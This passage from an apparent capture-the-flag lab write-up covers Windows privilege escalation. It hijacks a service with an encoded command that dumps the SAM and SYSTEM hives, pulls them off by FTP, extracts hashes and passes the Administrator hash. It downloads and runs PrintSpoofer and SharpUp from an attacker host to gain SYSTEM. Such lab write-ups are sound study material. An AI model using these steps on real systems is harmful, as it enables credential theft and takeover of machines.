sc.exe config UsoSvc binpath= "cmd.exe /c powershell.exe -EncodedCommand cgBlAGcAIABzAGEAdgBlACAASABLAEwATQBcAFMAQQBNACAAQwA6AAAAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwARABvAGMAdQBtAGUAbgB0AHMAXABzAGEAbQAuAGgAaQB2AGUAIAAmACYAIAByAGUAZwAgAHMAYQB2AGUAIABIAEsATABNAFwAUwBZAFMAVABFAE0AIABDADoAAABzAGUAcgBzAFwAUAB1AGIAbABpAGMAXABEAG8AYwB1AG0AZQBuAHQAcwBcAHMAeQBzAHQAZQBtAC4AaABpAHYAZQA="
```
**STEP3:** Restart the service for updating its parameters.
```powershell
PS C:\windows\system32\inetsrv> sc.exe stop UsoSvc
PS C:\windows\system32\inetsrv> sc.exe start UsoSvc
```
**STEP4:** Check folder where you saved it!
```bash
PS C:\Users\Public\Documents> ls

Mode                LastWriteTime         Length Name                                        ----                -------------         ------ ----       
-a----         8/2/2026   7:10 PM          49152 sam.hive              
-a----         8/2/2026   7:10 PM       17821696 system.hive  
```
**STEP5**: Copy it to the `ftp_transfer` folder
```powershell
Copy-Item C:\Users\Public\Documents\sam.hive C:\ftp_transfer
Copy-Item C:\Users\Public\Documents\system.hive C:\ftp_transfer
```

Now, from out local machine we connect to the ftp, using `anonymous` login and random password, then download both files
```bash
ftp 10.129.39.112                                                      
Connected to 10.129.39.112.
220 Microsoft FTP Service
Name (10.129.39.112:lilith): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
150 Opening ASCII mode data connection.
08-02-26  07:10PM                49152 sam.hive
08-02-26  07:10PM             17821696 system.hive
226 Transfer complete.
ftp> get system.hive
200 PORT command successful.
150 Opening ASCII mode data connection.
WARNING! 24258 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
17821696 bytes received in 18.4205 seconds (944.8149 kbytes/s)
ftp> get sam.hive
200 PORT command successful.
125 Data connection already open; Transfer starting.
WARNING! 99 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
49152 bytes received in 0.3797 seconds (126.4023 kbytes/s)
ftp> quit
```

##### impacket secretsdump.py
**`secretsdump.py`** - uses boot key (sys key) for decrypt and extract passwords and usernames from the `SAM` and `LSA` (Local Security Authority). _**Process chain:**_ `Boot key` - decrypts `SAM` key, then `SAM` key decrypts each user's hash.

```bash
secretsdump.py -sam sam.hive -system system.hive LOCAL
Impacket v0.14.0.dev0+20260611.171053.546f7acc - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xd132fb96a18c6ee06dee89f8effb8e06
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:86fc053bc0b23588798277b22540c40c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:05c9ce2fb8aad311f8447afa1398fb43:::
```
We successfully dumped `SAM` database. 
`Administrator:500:aad3b435b51404eeaad3b435b51404ee:86fc053bc0b23588798277b22540c40c:::` - is our loot, where `86fc053bc0b23588798277b22540c40c` - is the Administrator's hash

Let's try to login and confirm our privileges via `Evil-WinRm`
```bash
evil-winrm-py -u "Administrator" -H '86fc053bc0b23588798277b22540c40c' --ip  10.129.39.112       
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to '10.129.39.112:5985' as 'Administrator'
evil-winrm-py PS C:\Users\Administrator\Documents> exit
```

Hash is valid, we are in the system as the its administrator.

---

### Privilege Escalation Vector -  Kernel Exploitation
#### Enumeration
Previously was mentioned `Enabled` state of the some interesting privilege -  **`SeImpersonatePrivilege`**
```powershell
PS C:\windows\system32\inetsrv>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
...
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
...
```
**`SeImpersonatePrivilege`** - A Windows User Right Assignment that authorizes a program to impersonate a client or service context following authentication. When assigned to a low-privileged or service account, an attacker can exploit this capability to steal high-privileged access tokens (such as `NT AUTHORITY\SYSTEM`), leading to Local Privilege Escalation (LPE).

**`Potato family`** - A suite of Local Privilege Escalation (LPE) exploit tools (including _JuicyPotato_, _PrintSpoofer_, and _GodPotato_) designed to abuse `SeImpersonatePrivilege`. These tools coerce `SYSTEM`-level services into authenticating against a attacker-controlled local endpoint (via DCOM, RPC, or Named Pipes), capturing and impersonating the resulting token to gain elevated execution rights when prerequisite system conditions are met.

According to our previous Investigation:

```powershell
systeminfo

Host Name:                 REMOTE
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
```

**OS:** Microsoft Windows Server 2019 10.0.17763

The table of requirements for each version of exploit could be seen below:
https://github.com/GauthamV309/SeImpersonate-Auditor

The perfect option according to our system is `PrinSpoofer`, which requires only access to the named pipe + `spoolsv.exe ` service running

```powershell
evil-winrm-py PS C:\Users\Administrator\Documents> tasklist

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System                           4 Services                   0        136 K
...                  
spoolsv.exe                   1964 Services                   0     16,376 K
...         
TeamViewer_Service.exe        2264 Services                   0     25,312 K
...                 
```
Fortunately it is running.

Also, instead of manual checks, we can also use `SharpUp` audit tool, but we need to bear in mind that it produces overwhelming amount of noise that could be easily detected by EDR.
https://github.com/ghostpack/sharpup

```powershell
iwr http://10.10.14.240:5001/Debug/SharpUp.exe -UseBasicParsing -OutFile SharpUp.exe
./SharpUp.exe audit

=== SharpUp: Running Privilege Escalation Checks ===
[!] Modifialbe scheduled tasks were not evaluated due to permissions.
[+] Hijackable DLL: C:\inetpub\wwwroot\bin\AMD64\sqlceme40.dll
[+] Associated Process is w3wp with PID 1200 

=== Abusable Token Privileges ===
	SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED


=== Unattended Install Files ===
	C:\Windows\Panther\Unattend.xml


=== Modifiable Services ===
	[X] Exception: Exception has been thrown by the target of an invocation.
	[X] Exception: Exception has been thrown by the target of an invocation.
	[X] Exception: Exception has been thrown by the target of an invocation.
	Service 'UsoSvc' (State: Running, StartMode: Auto)



[*] Completed Privesc Checks in 2 seconds
```
It gives us the same results: 
	SeImpersonatePrivilege: `SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED`
	Modifiable Services - `UsoSvc`

#### Exploit Compilation + Privilege Escalation
##### How it works? 
For all comprehensive suite of information is provided in this article (created by exploit's developer):         https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/ 
PrintSpoofer GitHub Repository - https://github.com/itm4n/PrintSpoofer

For building an exploit we should enter in Microsoft Visual Studio, open solution file `.sln` and press `Ctrl + Shift + B` for building the executable file.
![](<../assets/img/Remote/Pasted image 20260804130049.png>)
**NOTE!:** For avoiding any errors, you need to set **`Code Generation`** `(Top Menu: Project -> Properties`) to **`Multi-threaded (/MT)`**

Retrieving file:
```powershell
iwr http://10.10.14.240:5001/PrintSpoofer.exe  -UseBasicParsing -OutFile PrintSpoofer.exe 
```
Executing it with the appropriate flags 
	(`-i` for opening another interactive session)
	(`-c` for executing command inside it)
```powershell
PS C:\Users\Public> ./PrintSpoofer.exe -i -c cmd.exe
./PrintSpoofer.exe -i -c cmd.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami 
whoami
nt authority\system
```
Congratulations, **we are the system.**
